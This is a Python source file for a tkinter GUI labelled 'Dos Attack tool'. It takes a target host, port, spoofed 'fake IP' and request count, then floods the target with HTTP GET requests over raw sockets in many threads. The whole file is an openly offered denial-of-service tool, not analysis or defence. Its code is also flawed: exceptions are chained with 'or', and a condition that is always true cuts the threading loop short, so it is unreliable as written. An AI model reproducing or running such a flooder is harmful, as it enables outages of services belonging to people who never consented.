import tkinter
from tkinter import *
from tkinter import font
from tkinter import ttk
import socket
import threading
import time
from tracemalloc import Traceback



fonts = [('Verdana, Geneva, Tahoma, sans-serif',16,'bold'),("'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif"
,10,'bold'),("'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif",10)]
win = Tk()
win.geometry('400x600')
win.title("Dos Attack tool")
win.resizable(0,0)

attack_num = 0

def attack():
    global host_ip, port, requests, host_ip_strvar, port_strvar, fake_ip_strvar, requests_strvar, update

    host_ip_strvar = host_ip.get()
    port_strvar = port.get()
    fake_ip_strvar = fake_ip.get()
    requests_strvar = requests.get()
    request_label.configure(text=requests_strvar)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host_ip_strvar, port_strvar))
            s.sendto(("GET /" + host_ip_strvar + " HTTP/1.1\r\n").encode('ascii'), (host_ip_strvar, port_strvar))
            s.sendto(("Host: " + fake_ip_strvar + "\r\n\r\n").encode('ascii'), (host_ip_strvar, port_strvar))
            global attack_num
            status_label.configure(text='Running')
            percentage = round((attack_num/requests_strvar)*100, 2)
            percentage_label.configure(text=str(percentage)+"%")
            attack_num += 1
            label.configure(text=attack_num)
            progress.configure(value=attack_num, maximum=requests_strvar)
            break  
        except TimeoutError or ConnectionRefusedError or OSError or Traceback or RuntimeError or TimeoutError:
            status_label.configure(text='Stopped')
            break
        finally:
            s.close() 
            
            

    for i in range(1000):
        thread = threading.Thread(target=attack)
        thread.start()
        if TimeoutError or KeyboardInterrupt:
            break
        elif attack_num == requests_strvar:
            status_label.configure(text='Stopped')
            break
        else:
            continue

canvas1 = Canvas(win, width=400, height=300, bg='#fff')
canvas1.pack(fill=BOTH, side=TOP)
canvas2 = Canvas(win, width=400, height=300, bg='#20bcd5')
canvas2.pack(fill=BOTH, side=BOTTOM)

host_ip = StringVar()
port = IntVar()
fake_ip = StringVar()
requests = IntVar()
requests_strvar = 0
update = StringVar()
Label(canvas1, font=fonts[0], bg="#fff", fg="#000", text="DOS Hack Tool").place(relx=0.3, rely=0.1)
Label(canvas1, text="Host IP: ", font=fonts[1], fg='#000', bg="#fff").place(relx=0.03, rely=0.3)
Entry(canvas1, width=20, textvariable=host_ip, fg="#000",font=fonts[1]).place(relx=0.18, rely=0.3)
Label(canvas1, text="Fake IP: ", font=fonts[1], fg='#000', bg="#fff").place(relx=0.03, rely=0.5)
Entry(canvas1, width=20, textvariable=fake_ip, fg="#000" ,font=fonts[1]).place(relx=0.18, rely=0.5)

Label(canvas1, text="Port: ", font=fonts[1], fg='#000', bg="#fff").place(relx=0.65, rely=0.3)
Entry(canvas1, width=10, textvariable=port, fg="#000",font=fonts[1]).place(relx=0.75, rely=0.3)
Label(canvas1, text="Requests: ", font=fonts[1], fg='#000', bg="#fff").place(relx=0.6, rely=0.5)
Entry(canvas1, width=10, textvariable=requests, fg="#000" ,font=fonts[1]).place(relx=0.77, rely=0.5)

Button(canvas1, width=20, height=1, bg="#20bcd5", text="Attack", command=attack, fg="#000",borderwidth=0, font=fonts[0]).place(relx=0.15, rely=0.8)

#Items on canvas2
Label(canvas2, text="Speed: ", bg="#20bcd5", fg="#000", font=fonts[2]).place(relx=0.05, rely=0.1)
Label(canvas2, text="500 requests/s", bg="#20bcd5", fg="#000", font=fonts[1]).place(relx=0.23, rely=0.1)
Label(canvas2, text="Request Sent: ", bg="#20bcd5", fg="#000", font=fonts[2]).place(relx=0.05, rely=0.25)
label = Label(canvas2, text=0, bg="#20bcd5", fg="#000", font=fonts[1])
label.place(relx=0.28, rely=0.25)
Label(canvas2, text="Total Requests: ", bg="#20bcd5", fg="#000", font=fonts[2]).place(relx=0.55, rely=0.1)
request_label = Label(canvas2, text=0, bg="#20bcd5", fg="#000", font=fonts[1])
request_label.place(relx=0.8, rely=0.1)
Label(canvas2, text="Status: ", bg="#20bcd5", fg="#000", font=fonts[2]).place(relx=0.55, rely=0.25)
status_label = Label(canvas2, text="Stopped", bg="#20bcd5", fg="#000", font=fonts[1])
status_label.place(relx=0.65, rely=0.25)
progress = ttk.Progressbar(canvas2,length=350,orient="horizontal", maximum=requests_strvar, value=attack_num)
progress.place(relx=0.05, rely=0.5)
percentage_label = Label(canvas2, text=0, bg="#20bcd5", fg="#000", font=fonts[1])
percentage_label.place(relx=0.48, rely=0.6)

win.mainloop()